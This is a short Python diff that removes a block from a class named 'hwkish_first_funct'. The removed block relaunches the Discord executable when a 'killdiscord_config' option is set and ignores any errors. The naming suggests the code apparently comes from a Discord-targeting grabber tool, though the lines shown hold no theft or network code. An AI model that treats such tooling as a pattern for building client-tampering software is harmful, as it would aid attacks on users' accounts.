@@ -1447,20 +1447,6 @@ class hwkish_first_funct(Functions):
                         except Exception as e:               
                             pass
                 
-                    if self.find_in_config("killdiscord_config"):
-                        file_name = os.path.splitext(os.path.basename(discord_path))[0]
-                        app_exe = os.path.join(app_path, file_name + ".exe")
-                        if not os.path.isabs(app_exe):
-                            raise ValueError(f"Invalid path: {app_exe}")
-                        cmd = [app_exe]
-                        try:
-                            subprocess.run(cmd, check=True)
-                        except subprocess.CalledProcessError as e:
-                            pass
-                        except FileNotFoundError as e:
-                            pass
-                        except Exception as e:               
-                            pass
 
     def soundlilvoice(self):
         if self.soundedornot != 'yes':
